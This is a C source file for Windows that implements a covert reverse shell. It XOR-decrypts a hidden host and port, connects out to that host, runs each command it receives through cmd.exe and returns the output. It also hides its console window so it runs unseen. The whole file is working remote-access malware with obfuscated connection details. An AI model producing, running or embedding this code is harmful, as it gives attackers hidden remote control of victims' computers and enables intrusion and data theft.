#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib, "ws2_32.lib")

// --- Encrypted blobs and KEY (same as before) ---
static const unsigned char KEY[32] = {
    'X','X','X','X','X','X','X','X','X','X','X','X','X','X','X','X',
    'X','X','X','X','X','X','X','X','X','X','X','X','X','X','X','X'
};

static const unsigned char ENCRYPTED_HOST[] = {
    0x69, 0x61, 0x6a, 0x76, 0x69, 0x6e, 0x60, 0x76, 0x68, 0x76, 0x69, 0x6a, 0x68
};
static const unsigned char ENCRYPTED_PORT[] = {
    0x6c, 0x6c, 0x6c, 0x6c
};

void xor_decrypt(const unsigned char* in, int in_len, unsigned char* out, const unsigned char* key, int key_len) {
    for (int i = 0; i < in_len; ++i) {
        out[i] = in[i] ^ key[i % key_len];
    }
}

DWORD WINAPI reverse_shell_thread(LPVOID lpParam) {
    int PORT = (int)(intptr_t)lpParam;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return 1;

    unsigned char host_buf[64] = {0};
    xor_decrypt(ENCRYPTED_HOST, sizeof(ENCRYPTED_HOST), host_buf, KEY, 32);

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = inet_addr((char*)host_buf);

    if (WSAConnect(s, (struct sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) != 0) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    // --- SIMPLIFIED: Exact Python logic with system() ---
    char recv_buf[1024];
    char cmd_buf[2048];

    while (1) {
        int recv_len = recv(s, recv_buf, sizeof(recv_buf) - 1, 0);
        if (recv_len <= 0) break;
        
        recv_buf[recv_len] = '\0';
        
        if (stricmp(recv_buf, "exit") == 0 || stricmp(recv_buf, "quit") == 0) {
            break;
        }

        // Build command: "cmd.exe /c <command>"
        snprintf(cmd_buf, sizeof(cmd_buf), "cmd.exe /c \"%s\"", recv_buf);
        
        // Execute and capture output
        FILE* pipe = _popen(cmd_buf, "r");
        if (pipe) {
            char output_buf[4096] = {0};
            char line_buf[256];
            
            // Read all output lines
            while (fgets(line_buf, sizeof(line_buf), pipe)) {
                strncat(output_buf, line_buf, sizeof(output_buf) - strlen(output_buf) - 1);
            }
            
            _pclose(pipe);
            
            // Send output + \\n (exact Python match)
            strcat(output_buf, "\\n");
            send(s, output_buf, strlen(output_buf), 0);
        } else {
            send(s, "\\n", 2, 0);
        }
    }

    closesocket(s);
    WSACleanup();
    return 0;
}

int main() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) ShowWindow(hwnd, SW_HIDE);

    unsigned char port_buf[16] = {0};
    xor_decrypt(ENCRYPTED_PORT, sizeof(ENCRYPTED_PORT), port_buf, KEY, 32);
    int PORT = atoi((char*)port_buf);

    HANDLE hThread = CreateThread(NULL, 0, reverse_shell_thread, (LPVOID)(intptr_t)PORT, 0, NULL);
    if (hThread != NULL) CloseHandle(hThread);

    while (1) Sleep(1000);
    return 0;
}
